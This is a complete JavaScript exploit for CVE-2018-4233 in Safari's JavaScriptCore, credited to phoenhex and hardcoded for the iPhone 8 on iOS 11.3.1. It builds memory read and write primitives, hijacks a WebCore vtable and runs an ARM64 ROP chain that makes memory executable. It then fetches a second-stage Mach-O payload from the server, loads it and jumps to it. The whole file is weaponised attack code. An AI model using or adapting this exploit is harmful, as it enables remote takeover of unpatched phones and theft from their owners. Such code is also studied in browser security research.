/*
 * Exploit by @_niklasb from phoenhex.
 *
 * This exploit uses CVE-2018-4233 (by saelo) to get RCE in WebContent.
 * The second stage is currently Ian Beer's empty_list kernel exploit,
 * adapted to use getattrlist() instead of fgetattrlist().
 *
 * Thanks to qwerty for some Mach-O tricks.
 *
 * Offsets hardcoded for iPhone 8, iOS 11.3.1.
 */
print = alert
ITERS = 10000
ALLOCS = 1000

var conversion_buffer = new ArrayBuffer(8)
var f64 = new Float64Array(conversion_buffer)
var i32 = new Uint32Array(conversion_buffer)

var BASE32 = 0x100000000
function f2i(f) {
    f64[0] = f
    return i32[0] + BASE32 * i32[1]
}

function i2f(i) {
    i32[0] = i % BASE32
    i32[1] = i / BASE32
    return f64[0]
}

function hexit(x) {
    if (x < 0)
        return `-${hex(-x)}`
    return `0x${x.toString(16)}`
}

function xor(a, b) {
    var res = 0, base = 1
    for (var i = 0; i < 64; ++i) {
        res += base * ((a&1) ^ (b&1))
        a = (a-(a&1))/2
        b = (b-(b&1))/2
        base *= 2
    }
    return res
}

function fail(x) {
    print('FAIL ' + x)
    throw null
}

// CVE-2018-4233
counter = 0
function trigger(constr, modify, res, val) {
    return eval(`
    var o = [13.37]
    var Constructor${counter} = function(o) { ${constr} }

    var hack = false

    var Wrapper = new Proxy(Constructor${counter}, {
        get: function() {
            if (hack) {
                ${modify}
            }
        }
    })

    for (var i = 0; i < ITERS; ++i)
        new Wrapper(o)

    hack = true
    var bar = new Wrapper(o)
    ${res}
    `)
}

function pwn(binary) {
    var stage1 = {
        addrof: function(victim) {
            return f2i(trigger('this.result = o[0]', 'o[0] = val', 'bar.result', victim))
        },

        fakeobj: function(addr) {
            return trigger('o[0] = val', 'o[0] = {}', 'o[0]', i2f(addr))
        },

        test: function() {
            var addr = this.addrof({a: 0x1337})
            var x = this.fakeobj(addr)
            if (x.a != 0x1337) {
                fail(1)
            }
        },
    }

    // Sanity check
    stage1.test()

    var structs = [];
    function sprayStructures() {
        // The StructureIDTable can contain holes (these contain the index of the next free slot,
        // kind of like a freelist, just with indices). Since there could be a lot of free entries
        // in the table our spray must be somewhat large.
        function randomString() {
            return Math.random().toString(36).replace(/[^a-z]+/g, '').substr(0, 5);
        }
        for (var i = 0; i < 0x1000; i++) {
            var a = new Float64Array(1);
            // Add a new property to create a new Structure instance.
            a[randomString()] = 1337;
            structs.push(a);        // keep the Structure objects alive.
        }
    }

    // The plan is to
    // 0. Create a lot of Structures for Float64Array instances
    // 1. Setup a fake Float64Array inside another object's inline properties.
    //    The data pointer points into a Uint8Array.
    // 2. Since we don't know the correct structure ID of a Float64Array instance,
    //    we find it using 'instanceof'.
    // 3. We now have an arbitrary read+write primitive since we control the data pointer
    //    of an Uint8Array.
    // 4. We need to fix up a few things so the garbage collector won't crash the process.

    // Set up lot's of structures for Float64Array instances.
    sprayStructures();

    // Create the array that will be used to read and write arbitrary memory addresses.
    var hax = new Uint8Array(0x1000);

    // Create fake JSObject.
    // print("[*] Setting up container object");

    var jsCellHeader = new Int64([
        00, 0x10, 00, 00,       // m_structureID, current guess.
                                // JSC allocats a set of structures for non-JSObjects (Executables, regular expression objects, ...)
                                // during start up. Avoid these by picking a high initial ID.
        0x0,                    // m_indexingType, None
        0x27,                   // m_type, Float64Array (doesn't really matter, will be different for older versions)
        0x18,                   // m_flags, OverridesGetOwnPropertySlot | InterceptsGetOwnPropertySlotByIndexEvenWhenLengthIsNotZero
        0x1                     // m_cellState, NewWhite
    ]);

    var container = {
        jsCellHeader: jsCellHeader.asJSValue(),
        butterfly: false,       // Some arbitrary value, we'll fix this up at the end.
        vector: hax,
        lengthAndFlags: (new Int64('0x0001000000000010')).asJSValue()
    };

    // Create the fake Float64Array.
    var address = Add(stage1.addrof(container), 16);
    // print("[*] Fake JSObject @ " + address);

    var fakearray = stage1.fakeobj(address);

    // From now on until we've set the butterfly pointer to a sane value (i.e. nullptr)
    // a GC run would crash the process. Thus, operations performed now should be
    // as fast as possible.

    // Find a StructureID for a Float64Array instance.
    while (!(fakearray instanceof Float64Array)) {
        // Try to avoid heap allocations here, we don't want to trigger GC.
        jsCellHeader.assignAdd(jsCellHeader, Int64.One);
        container.jsCellHeader = jsCellHeader.asJSValue();
    }

    // Maybe shouldn't print stuff here.. :P
    // print("[*] Float64Array structure ID found: " + jsCellHeader.toString().substr(-8));

    //
    // We now have an arbitrary read+write primitive since we can overwrite the
    // data pointer of an Uint8Array with an arbitrary address.
    //
    // Optimization: force JIT compilation for these methods.
    //
    memory = {
        read: function(addr, length) {
            // print("[<] Reading " + length + " bytes from " + hexit(addr));
            fakearray[2] = i2f(addr);
            var a = new Array(length);
            for (var i = 0; i < length; i++)
                a[i] = hax[i];
            return a;
        },

        readInt64: function(addr) {
            return new Int64(this.read(addr, 8));
        },

        write: function(addr, data) {
            // print("[>] Writing " + data.length + " bytes to " + hexit(addr));
            fakearray[2] = i2f(addr);
            for (var i = 0; i < data.length; i++)
                hax[i] = data[i];
        },

        writeInt64: function(addr, val) {
            return this.write(addr, val.bytes());
        }
    };

    // Fixup the JSCell header of the container to make it look like an empty object.
    // By default, JSObjects have an inline capacity of 6, enough to hold the fake Float64Array.
    var empty = {};
    var header = memory.read(stage1.addrof(empty), 8);
    memory.write(stage1.addrof(container), header);

    // Copy the JSCell and Butterfly (will be nullptr) from an existing Float64Array.
    var f64array = new Float64Array(8);
    header = memory.read(stage1.addrof(f64array), 16);
    memory.write(stage1.addrof(fakearray), header);

    // Set valid flags as well: make it look like an OversizeTypedArray
    // for easy GC survival (see JSGenericTypedArrayView<Adaptor>::visitChildren).
    memory.write(Add(stage1.addrof(fakearray), 24), [0x10,0,0,0,1,0,0,0]);

    // Root the container object so it isn't garbage collected.
    // This will allocate a butterfly for the fake object and store a reference to the container there.
    // The fake array itself is rooted by the memory object (closures).
    fakearray.container = container;

    var wrapper = document.createElement('div')
    var wrapper_addr = stage1.addrof(wrapper)

    var el_addr = memory.readInt64(wrapper_addr + 0x18)
    var vtab = memory.readInt64(el_addr)

    // regloader:
    // 0x180ee6048      e00317aa       mov x0, x23
    // 0x180ee604c      e10316aa       mov x1, x22
    // 0x180ee6050      e20318aa       mov x2, x24
    // 0x180ee6054      e30319aa       mov x3, x25
    // 0x180ee6058      e4031aaa       mov x4, x26
    // 0x180ee605c      e5031baa       mov x5, x27
    // 0x180ee6060      80033fd6       blr x28

    // dispatch:
    // 0x180d62e48      a0023fd6       blr x21
    // 0x180d62e4c      fd7b43a9       ldp x29, x30, [sp, 0x30]
    // 0x180d62e50      f44f42a9       ldp x20, x19, [sp, 0x20]
    // 0x180d62e54      f65741a9       ldp x22, x21, [sp, 0x10]
    // 0x180d62e58      ff030191       add sp, sp, 0x40
    // 0x180d62e5c      c0035fd6       ret

    // stackloader
    // 0x19331cfe0      fd7b46a9       ldp x29, x30, [sp, 0x60]
    // 0x19331cfe4      f44f45a9       ldp x20, x19, [sp, 0x50]
    // 0x19331cfe8      f65744a9       ldp x22, x21, [sp, 0x40]
    // 0x19331cfec      f85f43a9       ldp x24, x23, [sp, 0x30]
    // 0x19331cff0      fa6742a9       ldp x26, x25, [sp, 0x20]
    // 0x19331cff4      fc6f41a9       ldp x28, x27, [sp, 0x10]
    // 0x19331cff8      ffc30191       add sp, sp, 0x70
    // 0x19331cffc      c0035fd6       ret

    // __longjmp:
    // 0x180700ad4      135040a9       ldp x19, x20, [x0]
    // 0x180700ad8      155841a9       ldp x21, x22, [x0, 0x10]
    // 0x180700adc      176042a9       ldp x23, x24, [x0, 0x20]
    // 0x180700ae0      196843a9       ldp x25, x26, [x0, 0x30]
    // 0x180700ae4      1b7044a9       ldp x27, x28, [x0, 0x40]
    // 0x180700ae8      1d7845a9       ldp x29, x30, [x0, 0x50]
    // 0x180700aec      1d0846a9       ldp x29, x2, [x0, 0x60]


    function fsyms(mem, base, want)
    {
        var stab = null;
        var ncmds = mem.u32(Add(base, 0x10));
        for(var i = 0, off = 0x20; i < ncmds; ++i)
        {
            var cmd = mem.u32(Add(base, off));
            if(cmd == 0x2) // LC_SYMTAB
            {
                stab =
                {
                    symoff:  mem.u32(Add(base, off +  0x8)),
                    nsyms:   mem.u32(Add(base, off +  0xc)),
                    stroff:  mem.u32(Add(base, off + 0x10)),
                    strsize: mem.u32(Add(base, off + 0x14)),
                };
                break;
            }
            off += mem.u32(Add(base, off + 0x4));
        }
        if(stab == null)
        {
            fail("stab");
        }
        var strs = mem.read(Add(base, stab.stroff), stab.strsize);
        var syms = {};
        for(var i = 0; i < stab.nsyms && want.length > 0; ++i)
        {
            var strx = mem.u32(Add(base, stab.symoff + i * 0x10));
            for(var j = 0; j < want.length; ++j)
            {
                var s = want[j];
                var match = true;
                for(var k = 0; k < s.length; ++k)
                {
                    if(strs[strx + k] != s.charCodeAt(k))
                    {
                        match = false;
                        break;
                    }
                }
                if(match && strs[strx + s.length] == 0)
                {
                    syms[s] = mem.readInt64(Add(base, stab.symoff + i * 0x10 + 0x8));
                    want.splice(j, 1);
                    break;
                }
            }
        }
        /*if(fileOff)
        {
            want = Object.keys(syms);
            var real = {};
            for(var i = 0, off = 0x20; i < ncmds && want.length > 0; ++i)
            {
                var cmd = mem.u32(Add(base, off));
                if(cmd == 0x19) // LC_SEGMENT_64
                {
                    var vmaddr = mem.readInt64(Add(base, off + 0x18));
                    var fileoff = mem.readInt64(Add(base, off + 0x28));
                    var filesize = mem.readInt64(Add(base, off + 0x30));
                    var vmend = Add(start, filesize);
                    for(var j = 0; j < want.length; ++j)
                    {
                        var s = want[j];
                        var ad = syms[s];
                        var lo = ad.lo();
                        var hi = ad.hi();
                        if()
                        {
                            real[]
                        }
                    }
                }
                off += mem.u32(Add(base, off + 0x4));
            }
            syms = real;
        }*/
        return syms;
    }

    /*var slide               = Sub(memory.readInt64(vtab), 0x186d68698); // some ptr in WebCore (PrivateFrameworks one)
    var dlsym               = Add(0x18084ef90, slide);
    var longjmp             = Add(0x180700ad4, slide);
    var regloader           = Add(0x180ee6048, slide);
    var dispatch            = Add(0x180d62e48, slide);
    var stackloader         = Add(0x193318980, slide);
    var mach_task_self      = Add(0x180623204, slide);
    var mach_vm_protect     = Add(0x18062315c, slide);
    var memmove             = Add(0x180700d60, slide);
    var memPoolEnd          = memory.readInt64(Add(0x1a79e69a0, slide));*/
    var slide               = Sub(memory.readInt64(vtab), 0x186d61698); // __ZNK7WebCore4Node20eventTargetInterfaceEv
    var longjmp             = Add(0x180700ad4, slide);
    var regloader           = Add(0x180ee6048, slide);
    var dispatch            = Add(0x180d62e48, slide);
    var stackloader         = Add(0x19331cfe0, slide);
    var mach_task_self      = Add(0x180623204, slide);
    var mach_vm_protect     = Add(0x18062315c, slide);
    var memmove             = Add(0x180700d60, slide);
    var sleep               = Add(0x1805c9244, slide);
    var memPoolEnd          = memory.readInt64(Add(0x1a6b189a0, slide));

    // This is easier than Uint32Array and dividing offset all the time
    binary.u32 = function(i){ if(i instanceof Int64) i = i.lo(); return this[i] | (this[i+1] << 8) | (this[i+2] << 16) | (this[i+3] << 24); };
    binary.read = function(i, l) { if(i instanceof Int64) i = i.lo(); if(l instanceof Int64) l = l.lo(); return this.slice(i, i + l); };
    binary.readInt64 = function(addr) { return new Int64(this.read(addr, 8)); };
    binary.writeInt64 = function(i, val) { if(i instanceof Int64) i = i.lo(); this.set(val.bytes(), i); };
    var pstart = new Int64('0xffffffffffffffff');
    var pend   = new Int64(0);
    var ncmds  = binary.u32(0x10);
    for(var i = 0, off = 0x20; i < ncmds; ++i)
    {
        var cmd = binary.u32(off);
        if(cmd == 0x19) // LC_SEGMENT_64
        {
            var vmstart = binary.readInt64(off + 0x18);
            if(!(vmstart.hi() == 0 && vmstart.lo() == 0))
            {
                var vmend = Add(vmstart, binary.readInt64(off + 0x20));
                if(vmstart.hi() < pstart.hi() || (vmstart.hi() == pstart.hi() && vmstart.lo() < pstart.lo()))
                {
                    pstart = vmstart;
                }
                if(vmend.hi() > pend.hi() || (vmend.hi() == pend.hi() && vmend.lo() > pend.lo()))
                {
                    pend = vmend;
                }
            }
        }
        off += binary.u32(off + 0x4);
    }
    var shsz = Sub(pend, pstart);
    if(shsz.hi() != 0)
    {
        fail("shsz");
    }
    var payload = new Uint8Array(shsz.lo());
    var paddr = memory.readInt64(Add(stage1.addrof(payload), 0x10));
    var codeAddr = Sub(memPoolEnd, shsz);
    codeAddr = Sub(codeAddr, codeAddr.lo() & 0x3fff);
    var shslide = Sub(codeAddr, pstart);
    var off = 0x20;
    for(var i = 0; i < ncmds; ++i)
    {
        var cmd = binary.u32(off);
        if(cmd == 0x19) // LC_SEGMENT_64
        {
            var vmaddr   = binary.readInt64(off + 0x18);
            if(!(vmaddr.hi() == 0 && vmaddr.lo() == 0))
            {
                var vmsize   = binary.readInt64(off + 0x20);
                var fileoff  = binary.readInt64(off + 0x28);
                var filesize = binary.readInt64(off + 0x30);
                if(vmsize.hi() < filesize.hi() || (vmsize.hi() == filesize.hi() && vmsize.lo() < filesize.lo()))
                {
                    filesize = vmsize;
                }
                if(fileoff.hi() != 0)
                {
                    fail("fileoff");
                }
                if(filesize.hi() != 0)
                {
                    fail("filesize");
                }
                fileoff = fileoff.lo();
                filesize = filesize.lo();
                payload.set(binary.slice(fileoff, fileoff + filesize), Sub(vmaddr, pstart).lo());
                binary.writeInt64(off + 0x18, Add(vmaddr, shslide));
            }
        }
        off += binary.u32(off + 0x4);
    }
    payload.set(binary.slice(0x20, off), 0x20);

    memory.u32 = function(i){ var b = read(i, 4); return b[0] | (b[1] << 8) | (b[2] << 16) | (b[3] << 24); };
    payload.u32 = function(i){ if(i instanceof Int64) i = i.lo(); return this[i] | (this[i+1] << 8) | (this[i+2] << 16) | (this[i+3] << 24); };
    payload.read = function(i, l) { if(i instanceof Int64) i = i.lo(); if(l instanceof Int64) l = l.lo(); return this.slice(i, i + l); };
    payload.readInt64 = function(addr) { return new Int64(this.read(addr, 8)); };
    var psyms = fsyms(payload, 0, ["gaia"]);
    if(psyms.gaia == null)
    {
        fail("gaia");
    }
    var jmpAddr = Add(psyms.gaia, shslide);

    memory.writeInt64(Add(vtab, 0x18), longjmp);
    memory.writeInt64(Add(el_addr, 0x58), dispatch);        // x30 (gadget)
    memory.writeInt64(Add(el_addr, 0x10), mach_task_self);  // x21 (func)

    var arrsz = 0x100000,
        off   =   0x1000;
    var arr   = new Uint32Array(arrsz);
    var stack = memory.readInt64(Add(stage1.addrof(arr), 0x10));

    /*
    // shellcode
    var shsz = 0x0;
    //arr[shsz++] = 0xd65f03c0; // ret
    arr[shsz++] = 0xd28ccc00; // movz x0, 0x6660
    arr[shsz++] = 0xd61f0000; // br x0
    shsz = new Int64(shsz * 4);
    var codeAddr = Sub(memPoolEnd, shsz);
    */

    var pos = arrsz - off;
    // after dispatch:
    arr[pos++] = 0xdead0000;                // unused
    arr[pos++] = 0xdead0001;                // unused
    arr[pos++] = 0xdead0002;                // unused
    arr[pos++] = 0xdead0003;                // unused
    arr[pos++] = 0xdead0004;                // x22 (unused)
    arr[pos++] = 0xdead0005;                // x22 (unused)
    arr[pos++] = 0xdead0006;                // x21 (unused)
    arr[pos++] = 0xdead0007;                // x21 (unused)
    arr[pos++] = 0xdead0008;                // x20 (unused)
    arr[pos++] = 0xdead0009;                // x20 (unused)
    arr[pos++] = 0xdead000a;                // x19 (unused)
    arr[pos++] = 0xdead000b;                // x19 (unused)
    arr[pos++] = 0xdead000c;                // x29 (unused)
    arr[pos++] = 0xdead000d;                // x29 (unused)
    arr[pos++] = stackloader.lo();          // x30 (gadget)
    arr[pos++] = stackloader.hi();          // x30 (gadget)

    // in stackloader:
    arr[pos++] = 0xdead0010;                // unused
    arr[pos++] = 0xdead0011;                // unused
    arr[pos++] = 0xdead0012;                // unused
    arr[pos++] = 0xdead0013;                // unused
    arr[pos++] = dispatch.lo();             // x28 (gadget)
    arr[pos++] = dispatch.hi();             // x28 (gadget)
    arr[pos++] = 0xdead0014;                // x27 == x5 (unused)
    arr[pos++] = 0xdead0015;                // x27 == x5 (unused)
    arr[pos++] = 7;                         // x26 == x4 (prot)
    arr[pos++] = 0;                         // x26 == x4 (prot)
    arr[pos++] = 0;                         // x25 == x3 (max flag)
    arr[pos++] = 0;                         // x25 == x3 (max flag)
    arr[pos++] = shsz.lo();                 // x24 == x2 (size)
    arr[pos++] = shsz.hi();                 // x24 == x2 (size)
    arr[pos++] = 0xdead0016;                // x23 == x0 (skipped)
    arr[pos++] = 0xdead0017;                // x23 == x0 (skipped)
    arr[pos++] = codeAddr.lo();             // x22 == x1 (addr)
    arr[pos++] = codeAddr.hi();             // x22 == x1 (addr)
    arr[pos++] = mach_vm_protect.lo();      // x21 (func)
    arr[pos++] = mach_vm_protect.hi();      // x21 (func)
    arr[pos++] = 0xdead0018;                // x20 (unused)
    arr[pos++] = 0xdead0019;                // x20 (unused)
    arr[pos++] = 0xdead001a;                // x19 (unused)
    arr[pos++] = 0xdead001b;                // x19 (unused)
    arr[pos++] = 0xdead001c;                // x29 (unused)
    arr[pos++] = 0xdead001d;                // x29 (unused)
    // Need to skip the first instruction (4 bytes) of regloader because we already have x0
    var tmp = Add(regloader, 4);
    arr[pos++] = tmp.lo();                  // x30 (gadget)
    arr[pos++] = tmp.hi();                  // x30 (gadget)

    // after dispatch:
    arr[pos++] = 0xdead0020;                // unused
    arr[pos++] = 0xdead0021;                // unused
    arr[pos++] = 0xdead0022;                // unused
    arr[pos++] = 0xdead0023;                // unused
    arr[pos++] = 0xdead0024;                // x22 (unused)
    arr[pos++] = 0xdead0025;                // x22 (unused)
    arr[pos++] = 0xdead0026;                // x21 (unused)
    arr[pos++] = 0xdead0027;                // x21 (unused)
    arr[pos++] = 0xdead0028;                // x20 (unused)
    arr[pos++] = 0xdead0029;                // x20 (unused)
    arr[pos++] = 0xdead002a;                // x19 (unused)
    arr[pos++] = 0xdead002b;                // x19 (unused)
    arr[pos++] = 0xdead002c;                // x29 (unused)
    arr[pos++] = 0xdead002d;                // x29 (unused)
    arr[pos++] = stackloader.lo();          // x30 (gadget)
    arr[pos++] = stackloader.hi();          // x30 (gadget)

    // in stackloader:
    arr[pos++] = 0xdead0030;                // unused
    arr[pos++] = 0xdead0031;                // unused
    arr[pos++] = 0xdead0032;                // unused
    arr[pos++] = 0xdead0033;                // unused
    arr[pos++] = dispatch.lo();             // x28 (gadget)
    arr[pos++] = dispatch.hi();             // x28 (gadget)
    arr[pos++] = 0xdead0034;                // x27 == x5 (unused)
    arr[pos++] = 0xdead0035;                // x27 == x5 (unused)
    arr[pos++] = 0xdead0036;                // x26 == x4 (unused)
    arr[pos++] = 0xdead0037;                // x26 == x4 (unused)
    arr[pos++] = 0xdead0038;                // x25 == x3 (unused)
    arr[pos++] = 0xdead0039;                // x25 == x3 (unused)
    arr[pos++] = shsz.lo();                 // x24 == x2 (size)
    arr[pos++] = shsz.hi();                 // x24 == x2 (size)
    arr[pos++] = codeAddr.lo();             // x23 == x0 (dst)
    arr[pos++] = codeAddr.hi();             // x23 == x0 (dst)
    arr[pos++] = paddr.lo();                // x22 == x1 (src)
    arr[pos++] = paddr.hi();                // x22 == x1 (src)
    arr[pos++] = memmove.lo();              // x21 (func)
    arr[pos++] = memmove.hi();              // x21 (func)
    arr[pos++] = 0xdead003a;                // x20 (unused)
    arr[pos++] = 0xdead003b;                // x20 (unused)
    arr[pos++] = 0xdead003c;                // x19 (unused)
    arr[pos++] = 0xdead003d;                // x19 (unused)
    arr[pos++] = 0xdead003e;                // x29 (unused)
    arr[pos++] = 0xdead003f;                // x29 (unused)
    arr[pos++] = regloader.lo();            // x30 (gadget)
    arr[pos++] = regloader.hi();            // x30 (gadget)

    // after dispatch:
    arr[pos++] = 0xdead0040;                // unused
    arr[pos++] = 0xdead0041;                // unused
    arr[pos++] = 0xdead0042;                // unused
    arr[pos++] = 0xdead0043;                // unused
    arr[pos++] = 0xdead0044;                // x22 (unused)
    arr[pos++] = 0xdead0045;                // x22 (unused)
    arr[pos++] = 0xdead0046;                // x21 (unused)
    arr[pos++] = 0xdead0047;                // x21 (unused)
    arr[pos++] = 0xdead0048;                // x20 (unused)
    arr[pos++] = 0xdead0049;                // x20 (unused)
    arr[pos++] = 0xdead004a;                // x19 (unused)
    arr[pos++] = 0xdead004b;                // x19 (unused)
    arr[pos++] = 0xdead004c;                // x29 (unused)
    arr[pos++] = 0xdead004d;                // x29 (unused)
    arr[pos++] = stackloader.lo();          // x30 (gadget)
    arr[pos++] = stackloader.hi();          // x30 (gadget)

    // in stackloader:
    arr[pos++] = 0xdead0050;                // unused
    arr[pos++] = 0xdead0051;                // unused
    arr[pos++] = 0xdead0052;                // unused
    arr[pos++] = 0xdead0053;                // unused
    arr[pos++] = dispatch.lo();             // x28 (gadget)
    arr[pos++] = dispatch.hi();             // x28 (gadget)
    arr[pos++] = 0xdead0054;                // x27 == x5 (unused)
    arr[pos++] = 0xdead0055;                // x27 == x5 (unused)
    arr[pos++] = 0xdead0056;                // x26 == x4 (unused)
    arr[pos++] = 0xdead0057;                // x26 == x4 (unused)
    arr[pos++] = 0xdead0058;                // x25 == x3 (unused)
    arr[pos++] = 0xdead0059;                // x25 == x3 (unused)
    arr[pos++] = 0xdead005a;                // x24 == x2 (unused)
    arr[pos++] = 0xdead005b;                // x24 == x2 (unused)
    arr[pos++] = 1;                         // x23 == x0 (seconds)
    arr[pos++] = 0;                         // x23 == x0 (seconds)
    arr[pos++] = 0xdead005c;                // x22 == x1 (unused)
    arr[pos++] = 0xdead005d;                // x22 == x1 (unused)
    arr[pos++] = sleep.lo();                // x21 (func)
    arr[pos++] = sleep.hi();                // x21 (func)
    arr[pos++] = 0xdead005e;                // x20 (unused)
    arr[pos++] = 0xdead005f;                // x20 (unused)
    arr[pos++] = 0xdead0060;                // x19 (unused)
    arr[pos++] = 0xdead0061;                // x19 (unused)
    arr[pos++] = 0xdead0062;                // x29 (unused)
    arr[pos++] = 0xdead0063;                // x29 (unused)
    arr[pos++] = regloader.lo();            // x30 (gadget)
    arr[pos++] = regloader.hi();            // x30 (gadget)

    // after dispatch:
    arr[pos++] = 0xdead0070;                // unused
    arr[pos++] = 0xdead0071;                // unused
    arr[pos++] = 0xdead0072;                // unused
    arr[pos++] = 0xdead0073;                // unused
    arr[pos++] = 0xdead0074;                // x22
    arr[pos++] = 0xdead0075;                // x22
    arr[pos++] = 0xdead0076;                // x21
    arr[pos++] = 0xdead0077;                // x21
    arr[pos++] = 0xdead0078;                // x20
    arr[pos++] = 0xdead0079;                // x20
    arr[pos++] = 0xdead007a;                // x19
    arr[pos++] = 0xdead007b;                // x19
    arr[pos++] = 0xdead007c;                // x29
    arr[pos++] = 0xdead007d;                // x29
    arr[pos++] = jmpAddr.lo();              // x30 (payload)
    arr[pos++] = jmpAddr.hi();              // x30 (payload)

    // dummy
    for(var i = 0; i < 0x20; ++i)
    {
        arr[pos++] = 0xdeadc0de;
    }

    var sp = Add(stack, (arrsz - off) * 4);
    memory.writeInt64(Add(el_addr, 0x68), sp);      // x2 (copied into sp)

    // trigger
    wrapper.addEventListener('click', function(){});

    print("should never reach this");
}

function print_error(e) {
    print('Error: ' + e + '\n' + e.stack)
}

function go() {
    fetch('payload').then((response) => {
        response.arrayBuffer().then((buffer) => {
            try {
                pwn(new Uint8Array(buffer));
            } catch (e) {
                print_error(e);
            }
        })
    })
}
